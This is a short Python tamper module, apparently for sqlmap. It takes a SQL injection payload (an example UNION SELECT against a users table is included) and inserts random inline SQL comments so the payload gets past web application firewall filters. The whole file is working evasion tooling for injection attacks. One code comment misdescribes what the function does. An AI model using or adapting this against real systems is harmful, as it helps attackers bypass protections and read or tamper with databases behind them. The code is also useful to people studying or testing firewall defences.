import random

__example_payload__ = "' UNION SELECT NULL,NULL FROM users--"
__type__ = "SQL comment fragmentation: uses inline comments to break payload into WAF-invisible chunks"


def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Splits SQL keywords by inserting inline comments between characters
    comment_variants = [
        "/**/", "/***/", "/*!*/", "/*!50000*/", "/*!union*/",
        "/*!select*/", "/**_**/", "/*%/", "/**__*/"
    ]

    retval = ""
    for i, char in enumerate(payload):
        retval += char
        if char == ' ':
            retval += random.choice(comment_variants)
        elif char in ("'", '"') and random.random() > 0.7:
            retval += random.choice(comment_variants)

    return retval
